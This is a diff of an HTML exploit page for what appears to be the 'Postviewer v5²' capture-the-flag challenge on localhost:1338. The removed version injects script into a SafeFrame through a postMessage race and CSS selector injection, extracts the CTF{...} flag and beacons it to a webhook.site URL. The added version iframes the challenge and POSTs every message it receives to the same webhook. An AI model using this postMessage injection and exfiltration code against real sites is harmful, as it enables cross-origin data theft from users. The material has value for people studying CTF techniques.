@@ -1,167 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Fixed Flag Extraction</title>
+  <title>Postviewer v5² Exploit</title>
 </head>
 <body>
-    <h1>Flag Extraction</h1>
-    <div id="status">Extracting flag...</div>
-    
-    <script>
-        const WEBHOOK_URL = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
-        
-        // Fix: Make this function async
-        async function exfiltrateData(data) {
-            const payload = typeof data === 'string' ? data : JSON.stringify(data);
-            
-            try {
-                const img = new Image();
-                img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
-                document.body.appendChild(img);
-                
-                const script = document.createElement('script');
-                script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
-                document.head.appendChild(script);
-            } catch (e) {
-                console.error('Exfiltration failed:', e);
-            }
-        }
-        
-        // Fix: Make this function async
-        async function exploit() {
-            try {
-                await exfiltrateData({
-                    status: 'exploit_started',
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Open the main application
-                const win = window.open('http://localhost:1338', '_blank');
-                
-                if (!win) {
-                    await exfiltrateData({error: 'Could not open window'});
-                    return;
-                }
-                
-                // Wait for the app to load
-                setTimeout(async () => {
-                    try {
-                        // Use CSS selector injection to access the first file (flag)
-                        win.location = 'http://localhost:1338/#file-,a.list-group-item:nth-child(1)';
-                        
-                        await exfiltrateData({
-                            message: 'Navigated to flag file using CSS selector injection'
-                        });
-                        
-                        // Start the race condition attack
-                        let attempts = 0;
-                        const maxAttempts = 200;
-                        
-                        const raceInterval = setInterval(async () => {
-                            attempts++;
-                            
-                            if (attempts > maxAttempts) {
-                                clearInterval(raceInterval);
-                                await exfiltrateData({error: 'Race condition failed - max attempts reached'});
-                                return;
-                            }
-                            
-                            try {
-                                if (win.frames && win.frames.length > 0) {
-                                    // Send our payload to the SafeFrame
-                                    win.frames[0].postMessage({
-                                        body: `
-                                            <script>
-                                                // Extract flag from the page
-                                                try {
-                                                    const content = document.documentElement.innerHTML;
-                                                    const flagMatch = content.match(/CTF\\{[^}]+\\}/);
-                                                    if (flagMatch) {
-                                                        parent.parent.postMessage({
-                                                            flag: flagMatch[0],
-                                                            method: 'content_extraction',
-                                                            timestamp: Date.now()
-                                                        }, '*');
-                                                    }
-                                                    
-                                                    // Also try to access any text content
-                                                    const textContent = document.body.innerText || document.body.textContent;
-                                                    if (textContent && textContent.includes('CTF{')) {
-                                                        const textFlag = textContent.match(/CTF\\{[^}]+\\}/);
-                                                        if (textFlag) {
-                                                            parent.parent.postMessage({
-                                                                flag: textFlag[0],
-                                                                method: 'text_extraction',
-                                                                timestamp: Date.now()
-                                                            }, '*');
-                                                        }
-                                                    }
-                                                } catch (e) {
-                                                    parent.parent.postMessage({
-                                                        error: 'Flag extraction failed: ' + e.message
-                                                    }, '*');
-                                                }
-                                            <\/script>
-                                            <body>Race condition payload injected - attempt ${attempts}</body>
-                                        `,
-                                        mimeType: 'text/html'
-                                    }, '*');
-                                    
-                                    await exfiltrateData({
-                                        message: `Race condition payload sent - attempt ${attempts}`
-                                    });
-                                }
-                            } catch (e) {
-                                await exfiltrateData({
-                                    error: `Race attempt ${attempts} failed: ${e.message}`
-                                });
-                            }
-                        }, 25); // Race every 25ms
-                        
-                        // Stop racing after 10 seconds
-                        setTimeout(() => {
-                            clearInterval(raceInterval);
-                        }, 10000);
-                        
-                    } catch (error) {
-                        await exfiltrateData({
-                            error: 'Navigation failed',
-                            details: error.message
-                        });
-                    }
-                }, 2000);
-                
-            } catch (error) {
-                await exfiltrateData({
-                    error: 'exploit_failed',
-                    details: error.message
-                });
-            }
-        }
-        
-        // Listen for messages from the injected payload
-        window.addEventListener('message', async (event) => {
-            if (event.data && event.data.flag) {
-                await exfiltrateData({
-                    flag: event.data.flag,
-                    method: event.data.method || 'race_condition',
-                    timestamp: new Date().toISOString()
-                });
-                
-                // Also send just the flag
-                await exfiltrateData(event.data.flag);
-                
-                document.getElementById('status').innerHTML = 
-                    `<h2 style="color: green;">FLAG FOUND: ${event.data.flag}</h2>`;
-            } else if (event.data && event.data.error) {
-                await exfiltrateData({
-                    payload_error: event.data.error
-                });
-            }
-        });
-        
-        // Start the exploit (no await needed here since we're not in an async context)
-        exploit();
-    </script>
+  <h1>Running exploit...</h1>
+  <script>
+    const WEBHOOK_URL = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
+
+    // Listen for any messages from the iframe
+    window.addEventListener('message', async (event) => {
+      console.log('[+] Got message:', event.data);
+
+      // Forward to webhook as JSON
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(event.data)
+      });
+    });
+
+    // Create iframe pointing to the challenge
+    const iframe = document.createElement('iframe');
+    iframe.src = 'http://localhost:1338/';
+    iframe.width = 800;
+    iframe.height = 600;
+    document.body.appendChild(iframe);
+  </script>
 </body>
 </html>
